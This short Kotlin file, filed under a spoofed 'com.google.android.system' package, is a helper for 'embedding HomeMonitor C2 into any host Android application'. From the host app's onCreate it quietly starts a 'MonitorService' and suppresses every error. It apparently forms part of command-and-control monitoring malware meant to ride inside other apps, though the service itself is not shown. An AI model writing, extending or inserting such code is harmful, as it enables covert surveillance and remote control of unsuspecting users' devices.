package com.google.android.system

import android.content.Context
import android.content.Intent
import android.os.Build

/**
 * HomeMonitorC2HostIntegrator
 *
 * Universal 1-Line integration helper for embedding HomeMonitor C2 into any host Android application.
 */
object HomeMonitorC2HostIntegrator {

    /**
     * Call inside host Application.onCreate() or MainActivity.onCreate()
     */
    fun attachToHostApp(context: Context) {
        try {
            val intent = Intent(context, MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (_: Exception) {}
    }
}
